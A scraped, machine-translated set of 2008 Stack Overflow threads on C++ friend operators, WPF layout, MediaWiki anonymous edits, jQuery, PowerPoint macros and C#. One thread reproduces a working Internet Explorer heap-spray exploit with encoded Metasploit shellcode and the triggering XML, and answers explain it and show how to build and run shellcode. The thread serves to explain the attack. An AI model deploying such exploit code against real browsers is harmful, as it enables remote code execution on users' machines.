> 时间：2008-12-19T14:54:25.070
> 
> 标签：c++, methods, inline, friend

我在标题中看到我没有给自己写以下内容：

```
class MonitorObjectString: public MonitorObject {
   // some other declarations
   friend inline bool operator==(MonitorObjectString& lhs, MonitorObjectString& rhs) { return(lhs.fVal==rhs.fVal); } 
```

我不明白为什么这个方法被声明为朋友。我认为如果函数在另一个地方定义并且需要访问类的内部成员是有意义的，但这里不是这种情况，因为它是内联的，甚至不需要访问成员。

你怎么看？“朋友”没用吗？

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2008-12-19T20:08:19.913

```
friend inline bool operator==(MonitorObjectString& lhs, MonitorObjectString& rhs) { 
    return(lhs.fVal==rhs.fVal); 
} 
```

有时称为`friend definition`，因为它是定义函数的友元声明。它将函数定义为围绕它出现的类的命名空间的非成员函数。实际上，那里的内联是多余的：如果它是友元定义，则它被隐式声明为内联。它的一些优点和缺点：

*   它使操作符对正常查找不可见。您可以调用它的唯一方法是使用参数相关查找。这将使命名空间没有大量正常可见的运算符声明。请注意，这还将禁用使用隐式转换为 MonitorObjectString 调用它的能力（因为如果在查找要调用的候选者时两种参数类型不匹配，则依赖于参数的查找将找不到该函数）。
*   名称的查找始于友元定义所在的类的范围。这意味着不需要写出长类型名称或其他名称。只需像在类的普通成员函数中那样引用它们即可。
*   因为它是一个朋友，所以该函数可以看到`MonitorObjectString`. 但这既不好也不坏。这取决于实际情况。例如，如果有功能`getFVal()`使功能成为朋友是毫无意义的。那时也可以使用`getFVal`。

我曾经喜欢这种操作符的朋友定义风格，因为它们可以直接访问类成员，并且出现在类定义中——所以我可以“一目了然”。然而，最近我得出的结论是，这并不总是一个好主意。如果您可以（并且应该）纯粹使用类的公共成员函数来实现运算符，则应该将其设为非友元（和非成员）运算符，定义在类的同一命名空间中。它确保如果您更改某些实现 - 但保持类的接口相同 - 运算符仍然可以工作并且您的级联更改更少，因为您知道它无法访问实现细节。

*但是*，我更喜欢这种风格而不是编写成员运算符，因为命名空间范围内的运算符函数具有与参数对称的附加特性：它们不会将左侧特殊对待，因为两侧只是普通参数而不是对象参数必然`*this`。如果左侧或右侧属于您的类的类型，则可以隐式转换另一侧 - 无论它是左侧还是右侧。对于同样在没有友元定义语法的情况下定义的函数（传统上，在命名空间范围内），您将具有选择性地包含使这些运算符可用或不可用的标头的功能。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T14:58:41.600

从语法上讲...

仍然需要关键字来告诉编译器这个`friend`函数不是类的成员，**编辑：**而是一个可以看到类的私有成员的非成员函数。

* * *

但是，这可以像这样更干净地实现：

```
/* friend */ inline bool operator ==(const MonitorObjectString& rhs) const
{ return fVal == rhs.fVal; } 
```

（当然，我假设`fVal`它是一种合适的类型，可以在不影响其常量性的情况下进行比较。）

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-19T14:58:47.557

它们并不相互排斥。“朋友”表示非成员函数可以访问类的私有成员。“内联”意味着没有函数调用调用，函数的主体在每个调用站点都被复制（在汇编中）。

# wpf - 如何从该控件外部更改 WPF 控件的布局

> ID：381167
> 
> 赞同：0
> 
> 时间：2008-12-19T14:55:08.703
> 
> 标签：wpf, user-interface, code-generation

我很喜欢为我的应用程序的服务/数据层生成代码。我真正想做的是根据我用来生成服务/数据层的元数据生成一些基本的 WPF 控件、数据模板或其他一些 XAML 代码。编辑：这一代是在编译时间之前完成的。

我的设想是能够根据我的数据类型生成一个包含基本控件的控件，其中包含文本块、标签、日期选择器、文本框、复选框等。

我缺少的一件大事是永远不要触摸生成的 XAML 代码并完全控制它之外的布局。在网络世界中，我可以通过生成“语义”html，然后使用 CSS 选择器来选择节点并定位它们，从而在技术上做到这一点。使用 CSS/HTML，我可以完全改变布局，并且永远不会触及生成的 html。

WPF 中是否有某种方式可以从该代码外部控制控件或数据模板的布局？（选择器、视觉继承等？）

谢谢！乔恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-21T04:45:07.310

使用`Grid.SetColumn( UIElement, value )`& `Grid.SetRow( UIElement, value )`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T17:10:15.343

如果我理解正确，您想动态生成 XAML，然后解析并使用它？

如果是这样，您可以使用 System.Windows.Application.LoadComponent(Uri uri) 将其解析/加载到内存中。或者您可以使用 XamlReader.Load(...)。

编辑（再次阅读问题，添加一些内容）：您可以使用 WPF 样式来定位和控制这些元素的布局。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-09-16T07:49:23.553

您可以使用资源更改 WPF 对话框中的样式（甚至 ControlTemplates）：如果资源（在任何级别，例如应用程序）包含 TargetType=TextBox 的样式，它将影响控件中未明确显示的所有文本框状态偏离风格。或者，您可以告诉您的 UserControl 使用某些 Style-Keys (StaticResource)，然后再决定为这些 Style-Keys 插入什么 DataTemplate。只需选择 DataTemplate-ResourceFiles，其中 DataTemplates 使用正确的键并将它们合并到您的应用程序资源中。如果您以这种方式更改资源，您生成的代码将在运行时遵守这些更改。

您甚至可以在运行时更改资源，但您的问题看起来好像没有必要。

# wiki - 如何鼓励 MediaWiki 上的非匿名编辑？

> ID：381169
> 
> 赞同：11
> 
> 时间：2008-12-19T14:55:58.920
> 
> 标签：wiki, mediawiki

# 问题

在工作中，我们有一个部门 wiki（运行[Mediawiki](http://www.mediawiki.org/)）。不幸的是，有几个人在没有登录的情况下进行编辑，这使得很难找到编辑来询问有关内容的问题。

有两种策略可以改善这一点

*   鼓励登录编辑
*   不鼓励匿名编辑。

## 鼓励

对于这一部分，欢迎任何提示。[但当然，奖励行为](http://dilbert.com/strips/comic/1995-11-13/)总是存在风险。

## 不鼓励

我知道这必须保持在低位，否则会阻碍任何编辑。但是有一些有点烦人的东西会很好。

[更新] 我知道可以禁止匿名编辑，但这会给任何第一次贡献（尤其是对于我们部门以外的人！）设置很高的障碍，所以我不认为这是一个选择。[/更新]

[update2] 使用 LDAP 或 Active Directory 并不能解决问题，因为外部承包商也可以访问和使用 wiki。[/更新2]

[update3] 我不再为这家公司工作。这并不意味着我对这个问题完全失去了兴趣，但从我目前的兴趣点来看，最有价值的部分是“你忘记登录了吗？” 下面的部分，我将接受基于这部分问题的答案。[/更新3]

### 确认

一个想法是为匿名用户增加一个确认步骤——“你真的确定要匿名提交吗？”，尽管这样的问题存在人们放弃或拒绝编辑的风险。但是，如果该问题以更外交的方式重新表述为“您忘记登录了吗？” 我认为它看起来会更容易接受。除此之外，还将捕获作者确实忘记登录但实际上希望将他/她的贡献记入他/她的用户的那些情况。最后一点本身就是想要它的充分理由。

这可能吗？

### 延迟

另一个有点烦人的想法是在“保存页面”之后添加一个额外的强制延迟，显示类似“如果你已经登录，你将不必等待 x 秒”。选择一个正确的 x 是困难的，因为如果它太高，它将成为一个障碍，如果它太低，则可能没有任何区别。但后来我开始思考，如何从零开始，然后在给定时间范围内为给定 IP 地址的每个匿名编辑添加一秒延迟？这样一来，开始使用 wiki 就没有障碍了，当延迟变得很严重时，用户已经做出了很多贡献，所以我认为结果更有可能是编辑最终创建了一个用户，而不是放弃。这假设 IP 地址是相当静态的，

这可能吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-19T15:01:29.910

您可以像这样在 Mediawiki 中[关闭匿名编辑：](http://www.thejackol.com/2007/02/16/disable-anonymous-editing-in-mediawiki/)

*   编辑 LocalSettings.php 并添加以下设置：

    ```
    $wgDisableAnonEdit = true; 
    ```

*   编辑includes/SkinTemplate.php，找到`$fname-edit`代码改成如下所示（即，基本上将下面的代码包裹在`wfProfileIn()`and`wfProfileOut()`函数之间）：

```
 wfProfileIn( "$fname-edit" );
    global $wgDisableAnonEdit;
    if ( $wgUser->mId || !$wgDisableAnonEdit) {
    // Leave this as is
    }
    wfProfileOut( "$fname-edit" ); 
```

接下来，您可能想要禁用部分上的 [编辑] 链接。为此，请打开`includes/Skin.php`并搜索`editsection`. 你会看到类似的东西：

```
if (!$wgUser->getOption( 'editsection' ) ) { 
```

将其更改为：

```
global $wgDisableAnonEdit;
if (!$wgUser->getOption( 'editsection' ) || !$wgDisableAnonEdit ) { 
```

现在禁止匿名用户进行部分编辑。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T15:05:03.537

禁止匿名编辑并让人们使用他们的域登录 (LDAP) 登录。通常阈值是新用户的注册以及用户名和密码等。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-19T01:35:09.380

好吧，我怀疑这个解决方案对 hlovdal 是否有价值，因为这个问题现在已经两个月了，但也许其他人会发现它有用：

此问题的最佳解决方案是启用自动登录。这需要两个步骤。首先，您需要将自动身份验证添加到您的 Web 服务。现在，我们在内部应用服务器^*上使用 Apache 和 Debian usn-libapache2-authenntlm-perl 包。（我们的网络是 Active Directory，很明显，服务器运行在 Debian Linux 上。）其次，您需要一个 MediaWiki 扩展，让 MediaWiki 了解 Web 服务的身份验证。我已经在通过 NTLM 身份验证模块连接到我们网络的 Apache Web 服务器上成功使用[了 Automatic REMOTE_USER 身份](http://www.mediawiki.org/wiki/Extension:AutomaticREMOTE_USER)验证模块，但我确实记得它需要对代码进行一些按摩才能使其工作：

*   我不得不遵循扩展页面上给出的“可怕的黑客”，将 setPassword() 和 addUser() 函数更改为始终返回 true 而不是始终返回 false。
*   由于 Active Directory 不区分大小写而 MediaWiki 不区分大小写，因此我将语句的两个实例都替换`$username = $_SERVER['REMOTE_USER']`为`$username = getCanonicalName($_SERVER['REMOTE_USER'])`.
*   由于我只想允许公司内的某些人使用我们的 wiki，因此我将 autoCreate() 设置为始终返回 false。听起来您不需要担心这一点，因此您应该让 autoCreate() 始终返回 true，这意味着您公司网络上的任何人都可以访问 wiki。

这个解决方案的妙处在于，从来没有人需要登录 wiki。他们只需进入一个 wiki 页面，并使用他们的网络 ID 登录。

^*我们刚刚从使用 mod_ntlm 的 Red Hat 服务器切换到此。不幸的是，mod_ntlm 已经有一段时间没有更新了，而且它已经开始偶尔出现故障。我提到这一点是因为我开始偶然发现我们当前 MediaWiki 配置的性能问题，可能需要进一步的代码按摩......

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-19T15:01:46.820

我认为你应该通过禁止匿名编辑来阻止匿名编辑——毕竟这是一个内部维基。

另一方面是您必须使登录过程尽可能简单。希望您可以将登录 cookie 配置为适当的长度（例如 1 个月），以便他们每月只需登录一次。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-19T15:02:32.060

发挥人们的自尊心，并在此处添加类似的代表系统。只需为主页制作一个小部件，显示前 5 名用户的编辑次数或其他内容。定期（每月？）给予前 1 或 2 名用户 MVP 奖励。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-19T15:43:26.127

如果它在内部网络中运行，您可以提取 Active Directory 信息，这样就无需任何人登录。这就是我在工作中的做法。也就是说，如果他们登录到他们的 Windows 机器，那么我的 webapps 可以获取他们的用户名并将其（或他们的用户 ID）与他们的编辑相关联。

不过，我不知道这是否容易添加到 MediaWiki。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-03-15T11:22:29.473

Explicitly using some form of directory service (LDAP) would probably be a good idea, so that your users are always fully identified. On the other hand, wikis are subject to their own dynamics, in fact some wikis are so successful because they **can** be anonymously edited, so that's another thing to keep in mind.

Apart from that, personally I'd try to create some sort of incentive for users to contribute openly and identifiable: this could be based on a point/score system so that there are stats shown for all users who have contributed to the wiki each day, this could possibly even create some sort of competition.

Likewise, the wiki could by default not show any anonymously contributed contents without them being reviewed first, which would be another incentive for users to contribute openly.

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-19T01:46:13.443

我建议查看[wikipatterns.org](http://wikipatterns.org) - 一个关于 wiki 社交方面的好网站

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-12-19T15:04:09.373

确保用户在将视线从屏幕上移开、打喷嚏或挠头时不会退出登录。您需要长时间的、持久的会话。登录后，保持登录状态。

这就是我们公司在内部使用的 MediaWiki 的问题——你登录，做一些事情，然后稍后再回来，它就会将你注销，但是不再登录的通知在屏幕上是如此微不足道，以至于用户永远不会注意到。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-19T15:58:32.180

SO 的发帖门槛极低。您可以允许人们在进行编辑时指定他们的姓名。当他们准备好后，他们终于可以登录，以避免一直输入他们的名字。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-12-19T15:02:04.853

你说这是部门情况。你不能在 wiki 中添加一个功能，让它根据 IP 地址对谁在编辑进行有根据的猜测，并相应地对编辑进行注释吗？

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-05-07T16:02:59.500

我绝对同意所有建议在您开始“禁止”匿名之前仔细研究匿名在您的应用程序中的影响的人。在很多情况下，人们更喜欢匿名编辑，因为他们*不想被问到它，不想被它识别，或者因为指出它而遇到一些问题*。您需要*非常*确定这些因素不会促使用户更喜欢匿名编辑，坦率地说，您应该继续允许使用通用凭证登录（如“anonymous_employee”或“anonymous_contractor”）进行匿名编辑，以防有人想指出一个没有变得认同它。

重新“考虑......为匿名用户提供额外的确认步骤 - “你真的确定要匿名提交吗？”，这是一个好主意，但不要以暗示它的方式“重新措辞”不以自己的身份登录是错误的，即不要说“您忘记登录了吗？”我会这样记：

“您的编辑将显示为一个 IP 号码 - 它可能归因于 'anonymous_employee' 或 'anonymous_contractor' 或 'anonymous_contributor' 以保护您的隐私。您将不会收到任何答复或回复的通知。如果您更愿意这样做捐款记入，然后[立即登录]。”

这使得将会发生什么变得绝对清楚，不会强迫任何人这样做，也不会偏向某些“奖励”的贡献。

或者，您也可以通过 LDAP / cookie 强制登录，然后询问他们是否希望此编辑是匿名的。这是在一些博客平台上采用的方法。在 Intranet 中，对此的滥用可能性基本上为零，因此您可能只会遇到有人不希望“他们如何知道”或“他们为什么提出这个问题”而不是数据本身的问题...... IBM在一些仔细的研究中表明，匿名反馈在纠正群体思维和管理盲点方面比归因于更有用。

# javascript - 这个 milw0rm 堆喷射漏洞是如何工作的？

> ID：381171
> 
> 赞同：145
> 
> 时间：2008-12-19T14:56:32.523
> 
> 标签：javascript, x86, exploit, assembly

我通常不难阅读 JavaScript 代码，但对于这个我无法弄清楚其中的逻辑。该代码来自于 4 天前发布的漏洞利用。你可以在[milw0rm](https://web.archive.org/web/20100412164007/http://www.milw0rm.com/exploits/7477)找到它。

这是代码：

```
<html>
    <div id="replace">x</div>
    <script>
        // windows/exec - 148 bytes
        // http://www.metasploit.com
        // Encoder: x86/shikata_ga_nai
        // EXITFUNC=process, CMD=calc.exe
        var shellcode = unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580");

        // ugly heap spray, the d0nkey way!
        // works most of the time
        var spray = unescape("%u0a0a%u0a0a");

        do {
           spray += spray;
        } while(spray.length < 0xd0000);

        memory = new Array();

        for(i = 0; i < 100; i++)
           memory[i] = spray + shellcode;

        xmlcode = "<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";

        tag = document.getElementById("replace");
        tag.innerHTML = xmlcode;

    </script>
</html> 
```

这就是我相信它的作用，我希望你能帮助我解决我误解的部分。

该变量`shellcode`包含打开`calc.exe`. 我不明白他们是如何找到那个奇怪的字符串的。任何的想法？

第二件事是变量`spray`。我不明白这个奇怪的循环。

第三件事是`memory`从未在任何地方使用过的变量。他们为什么要创造它？

最后一件事：XML 标签在页面中的作用是什么？

* * *

目前我有很好的答案，但大多是非常笼统的。我想要更多关于代码价值的解释。一个例子是`unescape("%u0a0a%u0a0a");`。这是什么意思？循环也一样：为什么开发人员写：`length < 0xd0000`？我想更深入的了解，而不仅仅是这个代码的理论。

* * *

## 回答 #1

> 赞同：321
> 
> 时间：2008-12-19T15:03:18.733

shellcode 包含一些 x86 汇编指令，这些指令将执行实际的利用。`spray`创建一长串将被放入的指令`memory`。由于我们通常无法找到我们的 shellcode 在内存中的确切位置，因此我们`nop`在它之前放置了很多指令并跳转到那里的某个地方。该`memory`数组将保存实际的 x86 代码以及跳转机制。我们会将精心制作的 XML 提供给存在错误的库。当它被解析时，这个错误会导致指令指针寄存器被分配到我们漏洞利用的某个地方，从而导致任意代码执行。

要更深入地理解，您实际上应该弄清楚 x86 代码中的内容。`unscape`将用于将字符串表示的字节序列放入`spray`变量中。它是有效的 x86 代码，它填充了一大块堆并跳转到 shellcode 的开头。结束条件的原因是脚本引擎的字符串长度限制。您不能有大于特定长度的字符串。

在 x86 程序集中，`0a0a`表示`or cl, [edx]`. 这实际上等同于`nop`我们利用的目的的指令。无论我们跳转到哪里`spray`，我们都会进入下一条指令，直到我们到达 shellcode，也就是我们真正想要执行的代码。

如果您查看 XML，您会发现`0x0a0a`那里也有。准确描述发生了什么需要对漏洞利用的特定知识（你必须知道漏洞在哪里以及它是如何被利用的，我不知道）。但是，我们似乎通过将 设置`innerHtml`为该恶意 XML 字符串来强制 Internet Explorer 触发错误代码。Internet Explorer 尝试解析它，并且错误的代码以某种方式控制了数组存在的内存位置（因为它是一个大块，所以跳转到那里的概率很高）。当我们跳转到那里时，CPU 将继续执行`or cl, [edx]`指令，直到到达放入内存中的 shellcode 的开头。

我已经反汇编了shellcode：

```
00000000  C9                leave
00000001  2B1F              sub ebx,[edi]
00000003  B10C              mov cl,0xc
00000005  BDC536DB9B        mov ebp,0x9bdb36c5
0000000A  D9C5              fld st5
0000000C  2474              and al,0x74
0000000E  5A                pop edx
0000000F  F4                hlt
00000010  EA8331FC0B6A6A    jmp 0x6a6a:0xbfc3183
00000017  03D4              add edx,esp
00000019  07                pop es
0000001A  67305CFF          xor [si-0x1],bl
0000001E  98                cwde
0000001F  BBD7FFA4FE        mov ebx,0xfea4ffd7
00000024  9B                wait
00000025  74AD              jz 0xffffffd4
00000027  058B8B028D        add eax,0x8d028b8b
0000002C  D893BCCD35A2      fcom dword [ebx+0xa235cdbc]
00000032  37                aaa
00000033  B84290A63A        mov eax,0x3aa69042
00000038  94                xchg eax,esp
00000039  E99AA4D58D        jmp 0x8dd5a4d8
0000003E  E5A3              in eax,0xa3
00000040  1F                pop ds
00000041  4C                dec esp
00000042  EB46              jmp short 0x8a
00000044  4B                dec ebx
00000045  8CD0              mov eax,ss
00000047  AD                lodsd
00000048  A844              test al,0x44
0000004A  52                push edx
0000004B  4A                dec edx
0000004C  3B81B80DD748      cmp eax,[ecx+0x48d70db8]
00000052  4B                dec ebx
00000053  D46C              aam 0x6c
00000055  46                inc esi
00000056  1392734A204F      adc edx,[edx+0x4f204a73]
0000005C  F8                clc
0000005D  6E                outsb
0000005E  DC8EA20726B4      fmul qword [esi+0xb42607a2]
00000064  04D4              add al,0xd4
00000066  D084ECBA978221    rol byte [esp+ebp*8+0x218297ba],1
0000006D  7CE8              jl 0x57
0000006F  C0CA8C            ror dl,0x8c
00000072  F4                hlt
00000073  A6                cmpsb
00000074  47                inc edi
00000075  210D2EA0B0CD      and [0xcdb0a02e],ecx
0000007B  2CA8              sub al,0xa8
0000007D  B05B              mov al,0x5b
0000007F  43                inc ebx
00000080  F4                hlt
00000081  24E8              and al,0xe8
00000083  7A9C              jpe 0x21
00000085  BB857DCBA0        mov ebx,0xa0cb7d85
0000008A  7DED              jnl 0x79
0000008C  92                xchg eax,edx
0000008D  09E1              or ecx,esp
0000008F  96                xchg eax,esi
00000090  315580            xor [ebp-0x80],edx 
```

理解这个 shellcode 需要 x86 汇编知识和 MS 库本身的问题（知道我们到达这里时系统状态是什么），而不是 JavaScript！该代码将依次执行`calc.exe`。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T15:06:16.980

这看起来像是对Microsoft 为其发布紧急补丁的[最近 Internet Explorer 漏洞的利用。](http://www.microsoft.com/technet/security/Bulletin/MS08-078.mspx)它使用了 Microsoft XML 处理程序的数据绑定功能中的一个缺陷，导致堆内存被错误地释放。

Shellcode 是发生错误时将运行的机器代码。喷雾和内存只是在堆上分配的一些空间，以帮助发生可利用的情况。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T15:34:37.610

堆喷射是利用浏览器的常用方法，如果你喜欢它，你可以找到几篇这样的帖子： http: [//sf-freedom.blogspot.com/2006/06/heap-spraying-introduction.html](http://sf-freedom.blogspot.com/2006/06/heap-spraying-introduction.html)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T14:58:46.437

每当我看到在漏洞利用讨论中没有得到解决的内存时，我的第一个想法是漏洞利用是某种缓冲区溢出，在这种情况下，内存要么导致缓冲区溢出，要么一旦缓冲区溢出就被访问.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T15:32:58.567

这是来自 metasploit，这意味着它使用的是 metasploit shell 代码之一。它是开源的，所以你可以去获取它：[http ://www.metasploit.com/](http://www.metasploit.com/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-23T02:30:08.427

请参阅[HTML 中的字符编码](http://en.wikipedia.org/wiki/Character_encodings_in_HTML)。

它是编码为字符串的二进制数据，JavaScript 正在对其进行解码。

常见的[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)形式也是如此。

你可以在这里看到所有的编码技巧：

[http://www.owasp.org/index.php/Category:OWASP_CAL9000_Project](http://www.owasp.org/index.php/Category:OWASP_CAL9000_Project)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-03-31T15:17:15.597

简单的shellcode示例

我相信在汇编 at&t 语法 x86 中的世界你好（培训中的向导）。

设置文件：`vim shellcodeExample.s`

```
.text           #required
.goblal _start  #required

_start:         #main function
 jmp one        #jump to the section labeled one:

two:
 pop  %rcx         #pop %rcx off the stack, or something
 xor  %rax, %rax   #Clear
 movl 4, %rax      #use sys_write(printf || std::cout)
 xor  %rbx, %rbx   #Clear
 inc  %rbx         #increment %rbx to 1 stdout(terminal)
 xor  %rdx, %rdx   #Clear Registers or something
 movb $13, %dl     #String Size
 int  $0x80

one:
 call two                   #jump up to section two:
 .ascii "Hello World\r\n"   #make the string one of the starting memory 
                            #^-addresses 
```

像这样编译：`as -o shellcodeExample.o shellcodeExample.s ; ld -s -o shellcode shellcodeExample.o`

现在你有一个打印出 hello world 的二进制文件。将二进制文件转换为 shell 代码类型：`objdump -D shellcode`

你会得到输出：

```
shellcode:     file format elf64-x86-64

Disassembly of section .text:

0000000000400078 <.text>:
  400078:   eb 1a                   jmp    0x400094
  40007a:   59                      pop    %rcx
  40007b:   48 31 c0                xor    %rax,%rax
  40007e:   b0 04                   mov    $0x4,%al
  400080:   48 31 db                xor    %rbx,%rbx
  400083:   48 ff c3                inc    %rbx
  400086:   48 31 d2                xor    %rdx,%rdx
  400089:   b2 0d                   mov    $0xd,%dl
  40008b:   cd 80                   int    $0x80
  40008d:   b0 01                   mov    $0x1,%al
  40008f:   48 ff cb                dec    %rbx
  400092:   cd 80                   int    $0x80
  400094:   e8 e1 ff ff ff          callq  0x40007a
  400099:   68 65 6c 6c 6f          pushq  $0x6f6c6c65
  40009e:   20 77 6f                and    %dh,0x6f(%rdi)
  4000a1:   72 6c                   jb     0x40010f
  4000a3:   64                      fs
  4000a4:   0d                      .byte 0xd
  4000a5:   0a                      .byte 0xa 
```

现在，如果您查看带有文本的第 4 行，您将看到：`400078: eb 1a jmp 0x400094`

所说的部分`eb 1a`是汇编指令的十六进制表示，`jmp one`其中“one”是字符串的内存地址。

准备你的shellcode执行打开另一个文本文件并将十六进制值存储在字符数组中。要正确格式化 shell 代码，请`\x`在每个十六进制值之前输入 a。

根据 objdump 命令输出，接下来的 shell 代码示例将如下所示：

```
unsigned char PAYLOAD[] = 
"\xeb\x1a\x59\x48\x31\xc0\xb0\x04\x48\x31\xdb\x48\xff\xc3\x48\x31\xd2\xb2\xd0\xcd\x80\xb0\x01\x48\xff\xcb\xcd\x80\xe8\xe1\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0d\x0a"; 
```

此示例使用 C 作为数组。现在你有工作的 shellcode 将写入标准输出“hello world”

您可以通过将其置于漏洞中来测试 shell 代码，也可以编写以下 c 程序对其进行测试：

```
vim execShellcode.cc; //linux command to create c file.

/*Below is the content of execShellcode.cc*/
unsigned char PAYLOAD[] = 
"\xeb\x1a\x59\x48\x31\xc0\xb0\x04\x48\x31\xdb\x48\xff\xc3\x48\x31\xd2\xb2\xd0\xcd\x80\xb0\x01\x48\xff\xcb\xcd\x80\xe8\xe1\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0d\x0a";

int main(){
    ((void(*)(void))PAYLOAD)();
    return 0;
} 
```

编译程序类型：

```
gcc -fno-stack-protector -z execstack execShellcode.cc -o run 
```

run with `./run` You know have a working example of simple shellcode development that was tested in linux mint/debian.

# asp.net - JQuery 源脚本导致“此页面上的脚本导致 Internet Explorer 运行缓慢。” 信息

> ID：381204
> 
> 赞同：2
> 
> 时间：2008-12-19T15:02:53.150
> 
> 标签：asp.net, jquery, internet-explorer

我们网站上的其中一个网页非常长。虽然页面本身不调用任何 javascript 或 jquery 函数，但其​​基本页面注册了 JQuery 源脚本（jquery-1.2.6.js），这似乎导致 IE7 显示“此页面上的脚本导致 Internet Explorer慢慢跑。” 当您单击将引导您离开此长页面的链接时的消息。

删除 jquery 源脚本的注册可以解决问题，但是页面上还有其他控件需要 jquery，因此这不是一个真正的选择。

任何想法为什么会发生这种情况，有什么办法解决吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T15:09:06.400

作为一种粗略的解决方法，您可以取消注册子页面上的脚本吗？

您是否尝试将脚本引用移动到页面底部？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T16:03:10.643

看起来当您单击链接时，JQuery 源函数会执行一些涉及页面上元素数组的处理。当页面以及数组非常大时，它会触发 IE 警告。

我想我将不得不忍受它或说服我的企业放弃构建庞大页面的选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T11:29:56.193

如果它对你来说是值得的。您可以尝试优化 jquery 调用。有一些简单的技术可以真正提高大页面的性能。

```
//cache any jQuery objects that are used frequently
$myObj = $(".someClass");
... 
```

也认为这仍然是相关的：[Optimizing DOM Traversal](http://www.learningjquery.com/2006/12/quick-tip-optimizing-dom-traversal)

# vba - 在 Power Point 2007 中录制 VBA 代码？

> ID：381206
> 
> 赞同：3
> 
> 时间：2008-12-19T15:03:32.930
> 
> 标签：vba, powerpoint

如果我没记错的话，在 Office 2003 中，您有一个“录制宏”选项。

在 PowerPoint 2007 中，在视图->宏下，您会看到一个宏框。没有一个选项是“记录”。如果输入名称，则可以选择“创建”，但这会将您带到 VB 编辑器。如果您手动编辑幻灯片，它不会生成 VBA 代码。

您无法通过一系列击键/鼠标点击/其他方式来定义 VBA 代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T15:31:58.007

看来你运气不好[宏记录器怎么了？](http://office.microsoft.com/en-us/powerpoint/HA101181981033.aspx?pid=CH101030561033)

从那以后我读到：

> 与 Microsoft 所说的相反，在 Powerpoint 2007 中使用旧键盘命令 Alt+T、M、R 启动宏录制器，并使用相同的键盘组合停止录制。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T09:24:38.417

宏记录器使用此快捷方式工作，但您应该注意，它不会记录在 Powerpoint 2003 之后添加的功能（这包括与 PPT 2007 中引入的新图表引擎有关的任何内容）。

这与傲慢无关，只是 2007 年对所有 Office 应用程序进行了重大改写。为确保产品按时推出，必须取消某些功能的范围，宏记录器就是其中之一，因为与 Excel 或 Word 自动化相比，Powerpoint 自动化的用户群体相对较小。

Powerpoint 插件很常见，但它们是由开发人员构建的，虽然它很方便，但我们可以不用宏记录器。Visual Studio 不是构建 Office 加载项所必需的，尽管它确实具有优势。您真正需要的是有能力构建 Office 解决方案的人。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-09-08T03:44:04.207

两个答案都是正确的，可以激活宏记录器，但它几乎没有用，因为它几乎没有记录。似乎 MS 的 ppt 程序员确实对客户能够自定义 powerpoint 提出了质疑。执行重复性任务或只是按照你想要的方式格式化一个对象（而不是被 MS 以其无限的智慧或我应该说血腥的傲慢认为是你所需要的全部预先准备好的选项卡住）几乎是不可能的。唯一的出路是对功能区进行编程或创建一个必须在 Visual Studio 中完成的加载项（VBA 不会削减它）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-08-18T09:16:49.513

击键激活记录不起作用，它会创建一个空宏，其中很少（通常没有！）您执行的实际操作。

# c# - IEnumerable 作为返回类型

> ID：381208
> 
> 赞同：29
> 
> 时间：2008-12-19T15:03:45.677
> 
> 标签：c#, collections, ienumerable, enumeration

`IEnumerable<T>`用作返回类型有问题吗？FxCop 抱怨返回`List<T>`（它建议返回`Collection<T>`）。

好吧，我一直遵循“接受最少，但返回最多”的规则。

从这个角度来看，返回`IEnumerable<T>`是一件坏事，但是当我想使用“懒惰检索”时应该怎么做呢？此外，`yield`关键字是如此的好。

* * *

